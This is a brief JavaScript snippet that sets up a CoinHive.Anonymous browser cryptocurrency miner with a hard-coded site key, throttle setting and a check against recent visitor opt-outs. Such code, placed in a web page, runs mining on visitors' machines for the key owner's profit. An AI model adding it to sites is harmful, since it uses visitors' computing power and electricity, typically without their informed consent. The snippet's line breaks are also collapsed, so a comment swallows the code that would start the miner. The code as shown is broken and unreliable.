var miner = new CoinHive.Anonymous('rPM4mMSgSRNkxQ1bOAXZ2qnVybdoi2bz', {
    throttle: 0.6
}); // Only start on non-mobile devices and if not opted-out// in the last 14400 seconds (4 hours):if (!miner.isMobile() && !miner.didOptOut(14400)) {miner.start(CoinHive.IF_EXCLUSIVE_TAB);}